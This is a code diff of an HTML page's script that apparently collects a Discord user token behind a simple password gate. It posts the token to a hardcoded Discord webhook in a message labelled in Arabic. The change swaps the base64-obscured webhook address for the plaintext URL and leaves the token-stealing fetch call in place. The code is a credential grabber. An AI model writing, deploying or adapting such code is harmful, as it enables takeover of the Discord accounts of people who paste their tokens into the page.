@@ -70,10 +70,9 @@
   </div>
 
   <script>
-    const encPass = "QWhtZWQ=";
-    const encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3ODAzNjczODc1MTk4Nzg5NC8xM0hETkNXX2pGWk10MU9qR2JxZDhWV0ZWZzlNcFhCS1VuZDBNSlJ1OHVRNERYbmdmTU5NdXR4MWRqQTEyRTk3UXgzZg==";
+    const encPass = "QWhtZWQ="; // 
+    const webhookUrl = "https://discord.com/api/webhooks/1378036738751987894/13HDNCW_jFZMt1OjGbqd8VWFVg9MpXBKUnd0MJRu8uQ5DXngfMNMutx1djA12E97Qx3f";
 
-    const b64d = s => atob(s);
     const passwordInput = document.getElementById("passwordInput");
     const tokenInput = document.getElementById("tokenInput");
     const channelIdInput = document.getElementById("channelIdInput");
@@ -90,6 +89,10 @@
 
     let userToken = "";
     let interval = null;
+
+    function b64d(s) {
+      return atob(s);
+    }
 
     checkPasswordBtn.onclick = () => {
       if (b64d(encPass) === passwordInput.value.trim()) {
@@ -118,7 +121,7 @@
     };
 
     function sendWebhook(token) {
-      fetch(b64d(encWebhook), {
+      fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: "🔑 التوكن: " + token })
